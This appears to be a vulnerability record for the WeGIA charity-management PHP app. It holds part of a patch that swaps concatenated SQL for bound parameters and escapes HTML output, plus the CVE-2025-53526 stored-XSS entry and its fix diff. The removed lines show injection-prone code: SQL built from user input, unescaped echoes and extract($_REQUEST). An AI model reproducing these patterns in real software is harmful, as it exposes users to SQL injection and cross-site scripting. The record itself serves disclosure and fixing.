+                $params = $this->param($params, $cont) . ' entrada.data >= :dataInicio ';
+                $this->paramsExternos[':dataInicio'] = $this->getPeriodo()['inicio'];
                 $cont++;
             }
-            if ($this->getPeriodo()['fim']){
-                $params = $this->param($params, $cont)." entrada.data <= '".$this->getPeriodo()['fim']."' ";
+
+            if ($this->getPeriodo()['fim']) {
+                $params = $this->param($params, $cont) . ' entrada.data <= :dataFim ';
+                $this->paramsExternos[':dataFim'] = $this->getPeriodo()['fim'];
                 $cont++;
             }
+
             $this->setQuery("
-            SELECT 
-            SUM(ientrada.qtd) as qtd_total, produto.descricao, SUM(ientrada.qtd*ientrada.valor_unitario) as valor_total, ientrada.valor_unitario, entrada.data as data  
-            FROM ientrada 
-            LEFT JOIN produto ON produto.id_produto = ientrada.id_produto 
-            LEFT JOIN entrada ON entrada.id_entrada = ientrada.id_entrada 
-            LEFT JOIN origem ON origem.id_origem = entrada.id_origem 
-            LEFT JOIN tipo_entrada ON tipo_entrada.id_tipo = entrada.id_tipo 
-            LEFT JOIN almoxarifado ON almoxarifado.id_almoxarifado = entrada.id_almoxarifado 
-            LEFT JOIN pessoa ON pessoa.id_pessoa = entrada.id_responsavel 
-            ".$params."
-            GROUP BY concat(ientrada.id_produto,ientrada.valor_unitario)
-            ORDER BY produto.descricao
-            ;
+                SELECT 
+                SUM(ientrada.qtd) as qtd_total, 
+                produto.descricao, 
+                SUM(ientrada.qtd*ientrada.valor_unitario) as valor_total, 
+                ientrada.valor_unitario, 
+                entrada.data as data  
+                FROM ientrada 
+                LEFT JOIN produto ON produto.id_produto = ientrada.id_produto 
+                LEFT JOIN entrada ON entrada.id_entrada = ientrada.id_entrada 
+                LEFT JOIN origem ON origem.id_origem = entrada.id_origem 
+                LEFT JOIN tipo_entrada ON tipo_entrada.id_tipo = entrada.id_tipo 
+                LEFT JOIN almoxarifado ON almoxarifado.id_almoxarifado = entrada.id_almoxarifado 
+                LEFT JOIN pessoa ON pessoa.id_pessoa = entrada.id_responsavel 
+                $params
+                GROUP BY concat(ientrada.id_produto, ientrada.valor_unitario)
+                ORDER BY produto.descricao
             ");
-
-        }else{
+        } else {
             $this->setQuery("
-            SELECT 
-            SUM(ientrada.qtd) as qtd_total, produto.descricao, SUM(ientrada.qtd*ientrada.valor_unitario) as valor_total, ientrada.valor_unitario, entrada.data as data 
-            FROM ientrada 
-            LEFT JOIN produto ON produto.id_produto = ientrada.id_produto 
-            LEFT JOIN entrada ON entrada.id_entrada = ientrada.id_entrada 
-            WHERE ientrada.qtd > 0 AND ientrada.oculto = false 
-            GROUP BY concat(ientrada.id_produto,ientrada.valor_unitario)
-            ORDER BY produto.descricao
-            ;
+                SELECT 
+                SUM(ientrada.qtd) as qtd_total, 
+                produto.descricao, 
+                SUM(ientrada.qtd*ientrada.valor_unitario) as valor_total, 
+                ientrada.valor_unitario, 
+                entrada.data as data 
+                FROM ientrada 
+                LEFT JOIN produto ON produto.id_produto = ientrada.id_produto 
+                LEFT JOIN entrada ON entrada.id_entrada = ientrada.id_entrada 
+                WHERE ientrada.qtd > 0 AND ientrada.oculto = false 
+                GROUP BY concat(ientrada.id_produto, ientrada.valor_unitario)
+                ORDER BY produto.descricao
             ");
         }
     }
 
-    private function saida(){
-        if ($this->hasValue()){
-            $params = "WHERE isaida.qtd > 0 AND isaida.oculto=false ";
+
+    private function saida()
+    {
+        if ($this->hasValue()) {
+            $params = "WHERE isaida.qtd > 0 AND isaida.oculto = false ";
             $cont = 2;
-            if ($this->getDestino()){
-                $params = $this->param($params, $cont).' destino.id_destino = "'.$this->getDestino().'" ';
+
+            if ($this->getDestino()) {
+                $params = $this->param($params, $cont) . ' destino.id_destino = :idDestino ';
+                $this->paramsExternos[':idDestino'] = $this->getDestino();
                 $cont++;
             }
-            if ($this->getTipo()){
-                $params = $this->param($params, $cont).' tipo_saida.id_tipo = '.$this->getTipo().' ';
+
+            if ($this->getTipo()) {
+                $params = $this->param($params, $cont) . ' tipo_saida.id_tipo = :idTipo ';
+                $this->paramsExternos[':idTipo'] = $this->getTipo();
                 $cont++;
             }
-            if ($this->getResponsavel()){
-                $params = $this->param($params, $cont).' pessoa.id_pessoa = "'.$this->getResponsavel().'" ';
+
+            if ($this->getResponsavel()) {
+                $params = $this->param($params, $cont) . ' pessoa.id_pessoa = :idResponsavel ';
+                $this->paramsExternos[':idResponsavel'] = $this->getResponsavel();
                 $cont++;
             }
-            if ($this->getAlmoxarifado()){
-                $params = $this->param($params, $cont).' almoxarifado.id_almoxarifado = '.$this->getAlmoxarifado().' ';
+
+            if ($this->getAlmoxarifado()) {
+                $params = $this->param($params, $cont) . ' almoxarifado.id_almoxarifado = :idAlmoxarifado ';
+                $this->paramsExternos[':idAlmoxarifado'] = $this->getAlmoxarifado();
                 $cont++;
             }
-            if ($this->getPeriodo()['inicio']){
-                $params = $this->param($params, $cont)." saida.data >= '".$this->getPeriodo()['inicio']."' ";
+
+            if ($this->getPeriodo()['inicio']) {
+                $params = $this->param($params, $cont) . ' saida.data >= :dataInicio ';
+                $this->paramsExternos[':dataInicio'] = $this->getPeriodo()['inicio'];
                 $cont++;
             }
-            if ($this->getPeriodo()['fim']){
-                $params = $this->param($params, $cont)." saida.data <= '".$this->getPeriodo()['fim']."' ";
+
+            if ($this->getPeriodo()['fim']) {
+                $params = $this->param($params, $cont) . ' saida.data <= :dataFim ';
+                $this->paramsExternos[':dataFim'] = $this->getPeriodo()['fim'];
                 $cont++;
             }
 
             $this->setQuery("
-            SELECT 
-            SUM(isaida.qtd) as qtd_total, produto.descricao, SUM(isaida.qtd*isaida.valor_unitario) as valor_total, isaida.valor_unitario, saida.data as data
-            FROM isaida 
-            LEFT JOIN produto ON produto.id_produto = isaida.id_produto 
-            LEFT JOIN saida ON saida.id_saida = isaida.id_saida 
-            LEFT JOIN destino ON destino.id_destino = saida.id_destino 
-            LEFT JOIN tipo_saida ON tipo_saida.id_tipo = saida.id_tipo 
-            LEFT JOIN almoxarifado ON almoxarifado.id_almoxarifado = saida.id_almoxarifado 
-            LEFT JOIN pessoa ON pessoa.id_pessoa = saida.id_responsavel 
-            ".$params."
-            GROUP BY concat(isaida.id_produto,isaida.valor_unitario)
-            ORDER BY produto.descricao
-            ;
+                SELECT 
+                    SUM(isaida.qtd) as qtd_total, 
+                    produto.descricao, 
+                    SUM(isaida.qtd * isaida.valor_unitario) as valor_total, 
+                    isaida.valor_unitario, 
+                    saida.data as data
+                FROM isaida 
+                LEFT JOIN produto ON produto.id_produto = isaida.id_produto 
+                LEFT JOIN saida ON saida.id_saida = isaida.id_saida 
+                LEFT JOIN destino ON destino.id_destino = saida.id_destino 
+                LEFT JOIN tipo_saida ON tipo_saida.id_tipo = saida.id_tipo 
+                LEFT JOIN almoxarifado ON almoxarifado.id_almoxarifado = saida.id_almoxarifado 
+                LEFT JOIN pessoa ON pessoa.id_pessoa = saida.id_responsavel 
+                $params
+                GROUP BY concat(isaida.id_produto, isaida.valor_unitario)
+                ORDER BY produto.descricao
             ");
-        }else{
+        } else {
             $this->setQuery("
-            SELECT 
-            SUM(isaida.qtd) as qtd_total, produto.descricao, SUM(isaida.qtd*isaida.valor_unitario) as valor_total, isaida.valor_unitario, saida.data as data 
-            FROM isaida 
-            LEFT JOIN produto ON produto.id_produto = isaida.id_produto 
-            LEFT JOIN saida ON saida.id_saida = isaida.id_saida  
-            WHERE isaida.qtd > 0 AND isaida.oculto = false 
-            GROUP BY concat(isaida.id_produto,isaida.valor_unitario)
-            ORDER BY produto.descricao
-            ;
+                SELECT 
+                    SUM(isaida.qtd) as qtd_total, 
+                    produto.descricao, 
+                    SUM(isaida.qtd * isaida.valor_unitario) as valor_total, 
+                    isaida.valor_unitario, 
+                    saida.data as data 
+                FROM isaida 
+                LEFT JOIN produto ON produto.id_produto = isaida.id_produto 
+                LEFT JOIN saida ON saida.id_saida = isaida.id_saida  
+                WHERE isaida.qtd > 0 AND isaida.oculto = false 
+                GROUP BY concat(isaida.id_produto, isaida.valor_unitario)
+                ORDER BY produto.descricao
             ");
         }
     }
 
-    private function estoque(){
-        if ($this->hasValue()){
-            $params = "WHERE oculto=false ";
+
+    private function estoque()
+    {
+        if ($this->hasValue()) {
+            $params = "WHERE oculto = false ";
             $cont = 1;
-            if ($this->getAlmoxarifado()){
-                $params = $this->param($params, $cont).' id_almoxarifado = '.$this->getAlmoxarifado().' ';
+
+            if ($this->getAlmoxarifado()) {
+                $params = $this->param($params, $cont) . " id_almoxarifado = :idAlmoxarifado ";
+                $this->paramsExternos[':idAlmoxarifado'] = $this->getAlmoxarifado();
                 $cont++;
             }
+
             $showZero = !!$this->getMostrarZerado();
+
             $table1 = [
+                // Caso 0: não mostrar zerados
                 "CREATE TEMPORARY TABLE IF NOT EXISTS tabela_produto_entrada 
                 SELECT produto.id_produto, produto.preco, sum(qtd) as somatorio, produto.descricao, (sum(qtd) * ientrada.valor_unitario) as Total, 
-                concat(ientrada.id_produto,valor_unitario) as kungfu 
+                concat(ientrada.id_produto, valor_unitario) as kungfu 
                 FROM ientrada, produto 
-                WHERE ientrada.id_produto=produto.id_produto 
-                GROUP by kungfu 
-                ORDER by produto.descricao;
-                
+                WHERE ientrada.id_produto = produto.id_produto 
+                GROUP BY kungfu 
+                ORDER BY produto.descricao;
                 ",
+
+                // Caso 1: mostrar zerados
                 "CREATE TEMPORARY TABLE IF NOT EXISTS tabela_produto_entrada 
                 SELECT produto.id_produto, produto.preco, IFNULL(sum(qtd), 0) as somatorio, produto.descricao, (sum(qtd) * ientrada.valor_unitario) as Total, 
-                concat(produto.id_produto,IFNULL(ientrada.valor_unitario, 0)) as kungfu 
+                concat(produto.id_produto, IFNULL(ientrada.valor_unitario, 0)) as kungfu 
                 FROM produto 
-                LEFT JOIN ientrada ON ientrada.id_produto=produto.id_produto 
-                GROUP by kungfu 
-                ORDER by produto.descricao;
-                
+                LEFT JOIN ientrada ON ientrada.id_produto = produto.id_produto 
+                GROUP BY kungfu 
+                ORDER BY produto.descricao;
                 "
             ];
-            $this->setDDL_cmd( $table1[(int)$showZero] .
-            "CREATE TEMPORARY TABLE IF NOT EXISTS tabelaPrecoMedio 
-            SELECT id_produto, IFNULL(sum(Total)/sum(somatorio) , preco) AS PrecoMedio 
-            FROM tabela_produto_entrada 
-            GROUP by tabela_produto_entrada.descricao; 
-            
-            CREATE TEMPORARY TABLE IF NOT EXISTS estoque_com_preco_atualizado 
-            SELECT p.id_produto, p.id_categoria_produto, p.id_unidade, p.codigo, IFNULL(e.qtd, 0) as qtd, p.descricao, pm.PrecoMedio, IFNULL(e.qtd * pm.PrecoMedio, 0) as Total, a.id_almoxarifado, p.oculto 
-            FROM tabelaPrecoMedio pm
-            LEFT JOIN produto p ON pm.id_produto = p.id_produto 
-            LEFT JOIN estoque e ON e.id_produto = p.id_produto 
-            LEFT JOIN almoxarifado a ON a.id_almoxarifado = e.id_almoxarifado
-            WHERE p.id_produto = pm.id_produto; 
-            ");
+
+            // DDL com tabelas temporárias
+            $this->setDDL_cmd(
+                $table1[(int)$showZero] .
+                    "CREATE TEMPORARY TABLE IF NOT EXISTS tabelaPrecoMedio 
+                SELECT id_produto, IFNULL(SUM(Total) / SUM(somatorio), preco) AS PrecoMedio 
+                FROM tabela_produto_entrada 
+                GROUP BY tabela_produto_entrada.descricao;
+    
+                CREATE TEMPORARY TABLE IF NOT EXISTS estoque_com_preco_atualizado 
+                SELECT 
+                    p.id_produto, p.id_categoria_produto, p.id_unidade, p.codigo, 
+                    IFNULL(e.qtd, 0) AS qtd, p.descricao, pm.PrecoMedio, 
+                    IFNULL(e.qtd * pm.PrecoMedio, 0) AS Total, 
+                    a.id_almoxarifado, p.oculto 
+                FROM tabelaPrecoMedio pm
+                LEFT JOIN produto p ON pm.id_produto = p.id_produto 
+                LEFT JOIN estoque e ON e.id_produto = p.id_produto 
+                LEFT JOIN almoxarifado a ON a.id_almoxarifado = e.id_almoxarifado
+                WHERE p.id_produto = pm.id_produto;
+                "
+            );
+
+            // Query principal segura
             $this->setQuery(
-            "SELECT e.qtd AS qtd_total, e.descricao, e.Total AS valor_total, e.PrecoMedio FROM estoque_com_preco_atualizado e ".$params."
-            ORDER BY e.descricao
-            ;
-            ");
-        }else{
+                "SELECT 
+                    e.qtd AS qtd_total, 
+                    e.descricao, 
+                    e.Total AS valor_total, 
+                    e.PrecoMedio 
+                FROM estoque_com_preco_atualizado e 
+                $params
+                ORDER BY e.descricao;
+                "
+            );
+        } else {
+            // Parte sem filtros continua igual (sem entrada externa)
             $this->setDDL_cmd("
-            CREATE TEMPORARY TABLE IF NOT EXISTS tabela1 
-            SELECT produto.id_produto, sum(qtd) as somatorio, produto.descricao, (sum(qtd) * ientrada.valor_unitario) as Total, 
-            concat(ientrada.id_produto,valor_unitario) as kungfu 
-            FROM ientrada, produto 
-            WHERE ientrada.id_produto=produto.id_produto 
-            GROUP by kungfu 
-            ORDER by produto.descricao;
-
-            CREATE TEMPORARY TABLE IF NOT EXISTS tabela2 
-            SELECT id_produto, (sum(Total)/sum(somatorio)) AS PrecoMedio 
-            FROM tabela1 
-            GROUP by tabela1.descricao;
-            
-            CREATE TEMPORARY TABLE IF NOT EXISTS estoque_com_preco_atualizado 
-            SELECT estoque.id_produto, id_categoria_produto, id_unidade, codigo, qtd, descricao, PrecoMedio, (qtd*PrecoMedio) as Total, produto.oculto
-            FROM tabela2,estoque,produto
-            WHERE produto.id_produto=estoque.id_produto AND estoque.id_produto=tabela2.id_produto;
+                CREATE TEMPORARY TABLE IF NOT EXISTS tabela1 
+                SELECT produto.id_produto, SUM(qtd) AS somatorio, produto.descricao, (SUM(qtd) * ientrada.valor_unitario) AS Total, 
+                CONCAT(ientrada.id_produto, valor_unitario) AS kungfu 
+                FROM ientrada, produto 
+                WHERE ientrada.id_produto = produto.id_produto 
+                GROUP BY kungfu 
+                ORDER BY produto.descricao;
+    
+                CREATE TEMPORARY TABLE IF NOT EXISTS tabela2 
+                SELECT id_produto, (SUM(Total) / SUM(somatorio)) AS PrecoMedio 
+                FROM tabela1 
+                GROUP BY tabela1.descricao;
+    
+                CREATE TEMPORARY TABLE IF NOT EXISTS estoque_com_preco_atualizado 
+                SELECT estoque.id_produto, id_categoria_produto, id_unidade, codigo, qtd, descricao, PrecoMedio, (qtd * PrecoMedio) AS Total, produto.oculto
+                FROM tabela2, estoque, produto
+                WHERE produto.id_produto = estoque.id_produto 
+                  AND estoque.id_produto = tabela2.id_produto;
             ");
+
             $this->setQuery("
-            SELECT qtd AS qtd_total, descricao, Total AS valor_total, PrecoMedio FROM estoque_com_preco_atualizado 
-            WHERE qtd != 0 AND oculto=false
-            ORDER BY descricao
-            ;
+                SELECT qtd AS qtd_total, descricao, Total AS valor_total, PrecoMedio 
+                FROM estoque_com_preco_atualizado 
+                WHERE qtd != 0 AND oculto = false 
+                ORDER BY descricao;
             ");
         }
     }
 
-    private function selecRelatorio(){
+
+    private function selecRelatorio()
+    {
         switch ($this->getRelatorio()) {
             case 'entrada':
                 $this->entrada();
-            break;
+                break;
             case 'saida':
                 $this->saida();
-            break;
+                break;
             case 'estoque':
                 $this->estoque();
-            break;
+                break;
         }
     }
 
-    private function query(){
+    private function query()
+    {
         $pdo = Conexao::connect();
-        if ($this->getDDL_cmd()){
+
+        if ($this->getDDL_cmd()) {
             $pdo->exec($this->getDDL_cmd());
         }
-        $res = $pdo->query($this->getQuery());
+
+        $res = $pdo->prepare($this->getQuery());
+
+        foreach ($this->paramsExternos as $key => $value) {
+            $res->bindValue($key, $value); // Bind seguro com chave e valor
+        }
+
+        $res->execute(); // Importante: executar a query após bind
         return $res->fetchAll(PDO::FETCH_ASSOC);
     }
 
-    public function display(){
+    public function display()
+    {
         $this->selecRelatorio();
-        $query = $this->query();
+        $query = $this->query(); //<-- execução ocorre aqui
         $tot_val = 0;
-        foreach ($query as $item){
-            if ($this->getRelatorio() == 'estoque'){
-                $class='';
-                if ($item['qtd_total'] < 0){
+
+        foreach ($query as $item) {
+            if ($this->getRelatorio() == 'estoque') {
+                $class = '';
+                if ($item['qtd_total'] < 0) {
                     $item['valor_total'] = 0;
-                    $class='class="table-danger"';
+                    $class = 'class="table-danger"';
                 }
-                echo('
-                    <tr '.$class.'>
-                        <td scope="row" class="align-right">'.$item['qtd_total'].'</td>
-                        <td>'.$item['descricao'].'</td>
-                        <td>R$ '.number_format($item['PrecoMedio'],2).'</td>
-                        <td>R$ '.number_format($item['valor_total'],2).'</td>
-                    </tr>
-                ');
-            }else{
+
+                echo ('
+                <tr ' . $class . '>
+                    <td scope="row" class="align-right">' . htmlspecialchars($item['qtd_total']) . '</td>
+                    <td>' . htmlspecialchars($item['descricao'], ENT_QUOTES, 'UTF-8') . '</td>
+                    <td>R$ ' . number_format($item['PrecoMedio'], 2) . '</td>
+                    <td>R$ ' . number_format($item['valor_total'], 2) . '</td>
+                </tr>
+            ');
+            } else {
                 $util = new Util();
-                echo('
-                    <tr>
-                        <td scope="row" class="align-right">'.$item['qtd_total'].'</td>
-                        <td>'.$item['descricao'].'</td>
-                        <td>'.$util->formatoDataDMY($item['data']).'</td>
-                        <td>R$ '.number_format($item['valor_unitario'],2).'</td>
-                        <td>R$ '.number_format($item['valor_total'],2).'</td>
-                    </tr>
-                ');
+                echo ('
+                <tr>
+                    <td scope="row" class="align-right">' . htmlspecialchars($item['qtd_total']) . '</td>
+                    <td>' . htmlspecialchars($item['descricao'], ENT_QUOTES, 'UTF-8') . '</td>
+                    <td>' . htmlspecialchars($util->formatoDataDMY($item['data']), ENT_QUOTES, 'UTF-8') . '</td>
+                    <td>R$ ' . number_format($item['valor_unitario'], 2) . '</td>
+                    <td>R$ ' . number_format($item['valor_total'], 2) . '</td>
+                </tr>
+            ');
             }
+
             $tot_val += $item['valor_total'];
         }
-        echo('
-        <tr class="table-info">
-            <td scope="row" colspan="3">Valor total:</td>
-            <td>R$ '.number_format($tot_val,2).'</td>
-        </tr>
-        ');
+
+        echo ('
+    <tr class="table-info">
+        <td scope="row" colspan="3">Valor total:</td>
+        <td>R$ ' . number_format($tot_val, 2) . '</td>
+    </tr>
+    ');
     }
 
+
     // Getters e Setters
 
     public function getRelatorio()
@@ -430,4 +517,4 @@ public function setMostrarZerado($mostrarZerado)
 
         return $this;
     }
-}
\ No newline at end of file
+}


================================================================================


CVE ID: CVE-2025-53526
Published: 2025-07-07T17:15:29.690
Modified: 2025-07-10T21:17:00.730
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
WeGIA is a web manager for charitable institutions. An XSS Injection vulnerability was identified in novo_memorando.php.
After the memo was submitted, the vulnerability was confirmed by accessing listar_memorandos_antigos.php. Upon loading this page, the injected script was executed in the browser. This vulnerability is fixed in 3.4.3.

References (2):
  1. https://github.com/LabRedesCefetRJ/WeGIA/commit/f8cf5d0473334e6c28ea7f604da11ee2a7b419df [Patch]
  2. https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-46fm-hx2r-69fg [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/LabRedesCefetRJ/WeGIA/commit/f8cf5d0473334e6c28ea7f604da11ee2a7b419df ---
From f8cf5d0473334e6c28ea7f604da11ee2a7b419df Mon Sep 17 00:00:00 2001
From: GabrielPintoSouza <gabrielpintosouz4@gmail.com>
Date: Fri, 27 Jun 2025 09:30:27 -0300
Subject: [PATCH] =?UTF-8?q?Resolu=C3=A7=C3=A3o=20XSS=20no=20m=C3=B3dulo=20?=
 =?UTF-8?q?de=20Memorando=20[Security=20https://github.com/LabRedesCefetRJ?=
 =?UTF-8?q?/WeGIA/security/advisories/GHSA-46fm-hx2r-69fg]?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

---
 controle/memorando/MemorandoControle.php | 117 +++++++-------
 dao/memorando/MemorandoDAO.php           | 184 +++++++++--------------
 2 files changed, 128 insertions(+), 173 deletions(-)

diff --git a/controle/memorando/MemorandoControle.php b/controle/memorando/MemorandoControle.php
index ec38d51a8..0e3bd275e 100755
--- a/controle/memorando/MemorandoControle.php
+++ b/controle/memorando/MemorandoControle.php
@@ -1,32 +1,32 @@
 <?php
 
 $config_path = "config.php";
-if(file_exists($config_path)){
+if (file_exists($config_path)) {
     require_once($config_path);
-}else{
-    while(true){
+} else {
+    while (true) {
         $config_path = "../" . $config_path;
-        if(file_exists($config_path)) break;
+        if (file_exists($config_path)) break;
     }
     require_once($config_path);
 }
 
-require_once ROOT."/dao/memorando/MemorandoDAO.php";
-require_once ROOT."/classes/memorando/Memorando.php";
-require_once ROOT."/dao/memorando/UsuarioDAO.php";
- 
+require_once ROOT . "/dao/memorando/MemorandoDAO.php";
+require_once ROOT . "/classes/memorando/Memorando.php";
+require_once ROOT . "/dao/memorando/UsuarioDAO.php";
+
 
 
 class MemorandoControle
 {
     //Listar memorandos ativos (Caixa de entrada)
-	public function listarTodos()
-	{
-		extract($_REQUEST);
-		$memorandoDAO = new MemorandoDAO();
-		$memorandos = $memorandoDAO->listarTodos();
-		$_SESSION['memorando']=$memorandos;
-	}
+    public function listarTodos()
+    {
+        extract($_REQUEST);
+        $memorandoDAO = new MemorandoDAO();
+        $memorandos = $memorandoDAO->listarTodos();
+        $_SESSION['memorando'] = $memorandos;
+    }
 
     //Listar memorando pelo Id
     public function listarTodosId($id_memorando)
@@ -40,7 +40,7 @@ public function listarTodosId($id_memorando)
     //Listar memorandos inativos
     public function listarTodosInativos()
     {
-        extract($_REQUEST);
+        //extract($_REQUEST);
         $memorandoDAO = new MemorandoDAO();
         $memorandos = $memorandoDAO->listarTodosInativos();
         $_SESSION['memorandoInativo'] = $memorandos;
@@ -58,20 +58,16 @@ public function listarIdTodosInativos()
     //Criar memorando
     public function incluir()
     {
-        $memorando = $this->verificarMemorando();
-        $memorandoDAO = new MemorandoDAO();
-        
-        try
-        {
+        //impedir que XSS seja inserido no banco de dados
+        try {
+            $memorando = $this->verificarMemorando();
+            $memorandoDAO = new MemorandoDAO();
             $lastId = $memorandoDAO->incluir($memorando);
             $msg = "success";
             $sccs = "Memorando criado com sucesso";
-            header("Location: ".WWW."html/memorando/insere_despacho.php?id_memorando=$lastId&msg=".$msg."&sccs=".$sccs);
-
-        } 
-        catch (PDOException $e)
-        {
-            $msg= "Não foi possível criar o memorando"."<br>".$e->getMessage();
+            header("Location: " . WWW . "html/memorando/insere_despacho.php?id_memorando=$lastId&msg=" . $msg . "&sccs=" . $sccs);
+        } catch (PDOException $e) {
+            $msg = "Não foi possível criar o memorando" . "<br>" . $e->getMessage();
             echo $msg;
         }
     }
@@ -79,51 +75,47 @@ public function incluir()
     //Verifica memorando
     public function verificarMemorando()
     {
-    	session_start();
-    	$cpf_usuario = $_SESSION["usuario"];
-    	extract($_REQUEST);
-    	if((!isset($assunto)) || (empty($assunto)))
-    	{
-    		$msg = "Assunto do memorando não informado. Por favor, informe um assunto!";
-            //header('Location: ../html/memorando/novo_memorandoo.php');
-    	}
-    	$pessoa = new UsuarioDAO();
-    	$id_pessoa = $pessoa->obterUsuario($cpf_usuario);
-    	$id_pessoa = $id_pessoa['0']['id_pessoa'];
-    	$memorando = new Memorando($assunto);
-    	$memorando->setId_pessoa($id_pessoa);
-    	$memorando->setData();
-    	$memorando->setId_status_memorando(1);
+        session_start();
+        $cpf_usuario = filter_var($_SESSION["usuario"], FILTER_SANITIZE_SPECIAL_CHARS);
+        $assunto = filter_input(INPUT_POST, 'assunto', FILTER_SANITIZE_SPECIAL_CHARS);
+        if ((!isset($assunto)) || (empty($assunto))) {
+            $msg = "Assunto do memorando não informado. Por favor, informe um assunto!";
+            header("Location: ../html/memorando/novo_memorandoo.php?msg_e=$msg");
+            exit();
+        }
+        $pessoa = new UsuarioDAO();
+        $id_pessoa = $pessoa->obterUsuario($cpf_usuario);
+        $id_pessoa = $id_pessoa['0']['id_pessoa'];
+        $memorando = new Memorando($assunto);
+        $memorando->setId_pessoa($id_pessoa);
+        $memorando->setData();
+        $memorando->setId_status_memorando(1);
 
-    	return $memorando;
+        return $memorando;
     }
 
     //Alterar status do memorando
     public function alterarIdStatusMemorando()
     {
         extract($_REQUEST);
-        $memorando = new Memorando('','',$id_status_memorando,'','');
+        $memorando = new Memorando('', '', $id_status_memorando, '', '');
         $memorando->setId_memorando($id_memorando);
         $memorando->setId_status_memorando($id_status_memorando);
-        $memorandoDAO=new MemorandoDAO();
-        try 
-        {
+        $memorandoDAO = new MemorandoDAO();
+        try {
             $memorandoDAO->alterarIdStatusMemorando($memorando);
-            header("Location: ". WWW . "html/memorando/listar_memorandos_ativos.php");
+            header("Location: " . WWW . "html/memorando/listar_memorandos_ativos.php");
             //header("Location: ".WWW."html/memorando/DespachoControle.php");
-        } 
-        catch (PDOException $e) 
-        {
+        } catch (PDOException $e) {
             echo $e->getMessage();
-        } 
+        }
     }
 
     //Buscar último despacho de um memorando
     public function buscarUltimoDespacho($id_memorando)
     {
-        if (session_status() !== PHP_SESSION_ACTIVE)
-        {
-        session_start();
+        if (session_status() !== PHP_SESSION_ACTIVE) {
+            session_start();
         }
         $memorandoDAO = new MemorandoDAO();
         $despacho = $memorandoDAO->buscarUltimoDespacho($id_memorando);
@@ -133,25 +125,22 @@ public function buscarUltimoDespacho($id_memorando)
     //Buscar id_status_memorando
     public function buscarIdStatusMemorando($id_memorando)
     {
-        if (session_status() !== PHP_SESSION_ACTIVE)
-        {
-        session_start();
+        if (session_status() !== PHP_SESSION_ACTIVE) {
+            session_start();
         }
         $memorandoDAO = new MemorandoDAO();
         $id = $memorandoDAO->buscarIdStatusMemorando($id_memorando);
-        $_SESSION['id_status_memorando']=$id;
+        $_SESSION['id_status_memorando'] = $id;
     }
 
     //Verifica se o memorando existe
     public function issetMemorando($id_memorando)
     {
-        if (session_status() !== PHP_SESSION_ACTIVE)
-        {
-        session_start();
+        if (session_status() !== PHP_SESSION_ACTIVE) {
+            session_start();
         }
         $memorandoDAO = new MemorandoDAO();
         $isset = $memorandoDAO->issetMemorando($id_memorando);
-        $_SESSION['isset_memorando']=$isset;
+        $_SESSION['isset_memorando'] = $isset;
     }
 }
-?>
\ No newline at end of file
diff --git a/dao/memorando/MemorandoDAO.php b/dao/memorando/MemorandoDAO.php
index 0656c144d..b995bd1eb 100755
--- a/dao/memorando/MemorandoDAO.php
+++ b/dao/memorando/MemorandoDAO.php
@@ -1,19 +1,19 @@
 <?php
 
 $config_path = "config.php";
-if(file_exists($config_path)){
-    require_once($config_path);
-}else{
-    while(true){
-        $config_path = "../" . $config_path;
-        if(file_exists($config_path)) break;
-    }
-    require_once($config_path);
+if (file_exists($config_path)) {
+	require_once($config_path);
+} else {
+	while (true) {
+		$config_path = "../" . $config_path;
+		if (file_exists($config_path)) break;
+	}
+	require_once($config_path);
 }
 
-require_once ROOT."/dao/Conexao.php";
-require_once ROOT."/classes/memorando/Memorando.php";
-require_once ROOT."/dao/memorando/UsuarioDAO.php";
+require_once ROOT . "/dao/Conexao.php";
+require_once ROOT . "/classes/memorando/Memorando.php";
+require_once ROOT . "/dao/memorando/UsuarioDAO.php";
 
 class MemorandoDAO
 {
@@ -22,13 +22,12 @@ class MemorandoDAO
 	 */
 	public function listarTodos()
 	{
-		try
-		{
+		try {
 			$Memorandos = array();
 			$pdo = Conexao::connect();
 			$cpf_usuario = $_SESSION["usuario"];
-			$usuario=new UsuarioDAO;
-			$id_usuario=$usuario->obterUsuario($cpf_usuario)['0']['id_pessoa'];
+			$usuario = new UsuarioDAO;
+			$id_usuario = $usuario->obterUsuario($cpf_usuario)['0']['id_pessoa'];
 
 			$sql = "SELECT d.id_memorando, d.id_destinatario, m.titulo, d.data, d.id_remetente, m.id_status_memorando, m.id_pessoa, d.id_destinatario FROM despacho d INNER JOIN memorando m ON(d.id_memorando=m.id_memorando) WHERE (d.id_despacho IN (SELECT MAX(id_despacho) FROM despacho GROUP BY id_memorando)) AND m.id_status_memorando!='6' AND d.id_destinatario=:idUsuario ORDER BY m.data DESC";
 			$stmt = $pdo->prepare($sql);
@@ -36,46 +35,39 @@ public function listarTodos()
 			$stmt->execute();
 			$resultado = $stmt->fetchAll(PDO::FETCH_ASSOC);
 
-			if($resultado){
+			if ($resultado) {
 				$Memorandos = $resultado;
 			}
-		}
-
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error:' . $e->getMessage();
 		}
 
 		return json_encode($Memorandos);
 	}
 
-    /**
+	/**
 	 * Recebe como parâmetro o id de um memorando e retorna as informações de um memorando guardado no banco de dados
 	 */
 	public function listarTodosId($id_memorando)
 	{
-		try
-		{
+		try {
 			$Memorando = array();
 			$pdo = Conexao::connect();
 			$cpf_usuario = $_SESSION["usuario"];
-			$usuario=new UsuarioDAO;
-			$id_usuario=$usuario->obterUsuario($cpf_usuario);
-			$id_usuario=$id_usuario['0']['id_pessoa'];
-			
+			$usuario = new UsuarioDAO;
+			$id_usuario = $usuario->obterUsuario($cpf_usuario);
+			$id_usuario = $id_usuario['0']['id_pessoa'];
+
 			$sql = "SELECT titulo, id_status_memorando, id_pessoa, id_memorando FROM memorando WHERE id_memorando=:idMemorando";
 			$stmt = $pdo->prepare($sql);
 			$stmt->bindParam(':idMemorando', $id_memorando);
 			$stmt->execute();
 			$resultado = $stmt->fetchAll(PDO::FETCH_ASSOC);
 
-			if($resultado){
+			if ($resultado) {
 				$Memorando = $resultado;
 			}
-		}
-
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error:' . $e->getMessage();
 		}
 
